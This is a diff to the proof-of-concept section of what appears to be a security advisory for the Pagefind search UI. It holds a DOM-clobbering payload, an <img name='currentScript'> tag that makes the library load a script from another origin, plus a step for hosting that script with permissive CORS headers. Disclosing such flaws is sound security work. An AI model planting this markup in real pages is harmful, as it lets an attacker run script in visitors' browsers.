@@ -30,10 +30,7 @@ g = await import(`${r}pagefind.js`)
 ## PoC
 
 ```html
-<html>
-site
-<img name="currentScript" src="blob:http://localhost:8000/ui.js"></img>
-
+<!--Library-->
 <link href="pagefind/pagefind-ui.css" rel="stylesheet">
 <script src="pagefind/pagefind-ui.js"></script>
 <div id="search"></div>
@@ -42,7 +39,11 @@ site
         new PagefindUI({ element: "#search", showSubResults: true });
     });
 </script>
-</html>
+<!--Library-->
+
+<!--Payload-->
+<img name="currentScript" src="blob:http://localhost:9999/ui.js"></img>
+<!--Payload-->
 ```
 
 run pagefind to create index. create `pagefind.js`, needs to be hosted with Access-Control-Allow-Origin set. 
